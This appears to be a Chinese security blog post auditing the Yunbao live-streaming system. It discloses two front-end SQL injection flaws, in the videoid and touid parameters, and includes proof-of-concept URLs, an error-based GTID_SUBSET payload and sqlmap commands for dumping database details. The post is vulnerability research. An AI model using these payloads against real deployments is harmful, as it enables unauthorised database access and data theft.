---
title:  "[代码审计] 云豹科技直播系统"
date:   2019-07-09 09:06:01 +0800
categories: research
tags: ["代码审计"]
---

分享一下云豹科技直播系统的2处前台注入漏洞，[云豹直播系统](http://www.yunbaokj.com/) 采用ThinkCMF框架二次开发。



## VideoController.class.php

文件地址: /application/Appapi/Controller/VideoController.class.php:17

![image.png](https://i.loli.net/2021/02/22/d5UWQPF2rMEKvVZ.png)

代码中17行直接将videoid参数传入SQL执行器查询，导致了报错注入漏洞。

````
漏洞地址: http://localhost.com/index.php?g=Appapi&m=Video&videoid=1%27
````

![image.png](https://i.loli.net/2021/02/22/WPoc6Ihz9CfNnay.png)

程序执行的SQL语句如下：

~~~
 [ SQL语句 ] : SELECT * FROM `cmf_users_video` WHERE ( id=1' ) LIMIT 1
~~~

利用SQLMAP工具输出漏洞，需要闭合前缀括号`1) and 1=1 --+`

~~~
验证漏洞:http://localhost.com/index.php?g=Appapi&m=Video&videoid=1)%20and%201=1%20--+
SQLMAP参数: sqlmap -u http://localhost.com/index.php?g=Appapi&m=Video&videoid=1* –prefix "1)"
~~~

![image.png](https://i.loli.net/2021/02/22/NTlKUJR5voYILZg.png)

## PlaybackController.class.php

文件地址:/application/Home/Controller/PlaybackController.class.php:14

![image.png](https://i.loli.net/2021/02/22/FeP4EKdYT39O2nw.png)

代码14行将传入的touid参数未任何过滤参数直接拼接到SQL执行器。

~~~
漏洞地址:http://localhost.com/index.php?g=Home&m=Playback&touid=1%20AND%20GTID_SUBSET(CONCAT(md5(1340914307)),11)
~~~

![image.png](https://i.loli.net/2021/02/22/QGdZtV9TnF7pfbI.png)

程序SQL执行语句如下:

~~~
 [ SQL语句 ] : SELECT * FROM `cmf_users_liverecord` WHERE ( uid=1 AND GTID_SUBSET(CONCAT(md5(1340914307)),11) )
~~~

利用SQLMAP工具输出漏洞参数

~~~
sqlmap -u "http://localhost.com/index.php?g=Home&m=Playback&touid=1*" --current-user
~~~

![image.png](https://i.loli.net/2021/02/22/eulaziMQy31WnDd.png)





